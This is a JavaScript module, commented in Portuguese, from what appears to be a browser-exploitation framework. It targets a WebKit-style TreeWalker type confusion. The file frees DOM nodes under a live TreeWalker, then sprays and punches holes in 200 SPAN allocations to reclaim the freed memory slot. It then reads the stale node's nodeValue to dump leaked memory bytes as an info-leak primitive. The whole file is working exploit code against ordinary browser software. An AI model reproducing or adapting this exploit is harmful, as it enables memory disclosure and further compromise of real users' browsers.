import { GCOracle } from '../mod_executor.js';
import { Groomer } from '../mod_groomer.js';

export default {
    id:       'TREEWALKER_TYPE_CONFUSION',
    category: 'Exploit',
    risk:     'CRITICAL',
    description:
        'Primitiva de Info Leak: Explora a sobreposição exata de um TextNode e um SPAN. ' +
        'O tamanho em bytes da alocação foi restaurado para o original. Tentamos ler ' +
        'a memória C++ bruta vazada através da propriedade nodeValue.',

    setup: function() {
        this.sandbox = document.createElement('div');
        
        // 🚨 A ESTRUTURA ORIGINAL EXATA! (Sem adicionar caracteres extra)
        // Isso garante que o TextNode "A" tenha o tamanho perfeito no bmalloc.
        this.sandbox.innerHTML = '<span>A</span><b>B</b><i>C</i>';
        document.body.appendChild(this.sandbox);
        
        this.walker = document.createTreeWalker(this.sandbox, NodeFilter.SHOW_ALL, null, false);
        this.walker.nextNode(); // span
        this.walker.nextNode(); // text "A" (O nosso alvo que tem o tamanho perfeito)
        
        this.targetNode = this.walker.currentNode;

        if (GCOracle.registry) GCOracle.registry.register(this.targetNode, `${this.id}_target`);
    },

    trigger: function() {
        // 1. O GATILHO ORIGINAL EXATO! Destrói o DOM e liberta os nós.
        this.sandbox.innerHTML = '<video></video><audio></audio>';
        
        // 2. O CAOS DE MEMÓRIA (Substitui a necessidade de rodar 16 testes)
        // Alocamos SPANs na tentativa de um deles ocupar o "balde" exato deixado pelo TextNode.
        let nodes = Groomer.sprayDOM('span', 200);
        Groomer.punchHoles(nodes, 2);
    },

    probe: [
        // Probe 0 (A antiga Probe 1 da sua foto): 
        // Verifica se o nó mudou de #text para SPAN
        s => s.walker.currentNode.nodeName,
        
        // Probe 1: O Extrator de Memória (Info Leak)
        s => {
            let nodeName = s.walker.currentNode.nodeName;
            
            // Só tentamos o Leak SE a confusão de tipos tiver acontecido (ex: virou SPAN)
            if (nodeName !== '#text') {
                try {
                    let leakedData = s.walker.currentNode.nodeValue || s.walker.currentNode.data;
                    
                    if (leakedData && leakedData !== 'A') {
                        let hexDump = '';
                        // Lemos os primeiros 16 bytes corrompidos
                        for (let i = 0; i < Math.min(leakedData.length, 16); i++) {
                            hexDump += leakedData.charCodeAt(i).toString(16).padStart(4, '0') + ' ';
                        }
                        return `💥 INFO LEAK: ${hexDump}`;
                    }
                    return `Corrompido para ${nodeName}, mas sem texto legível.`;
                } catch(e) {
                    return `Crash na leitura: ${e.message}`;
                }
            }
            return 'Falhou: O nó ainda é um #text normal.';
        }
    ],

    cleanup: function() {
        try { this.sandbox.remove(); } catch(e) {}
    }
};
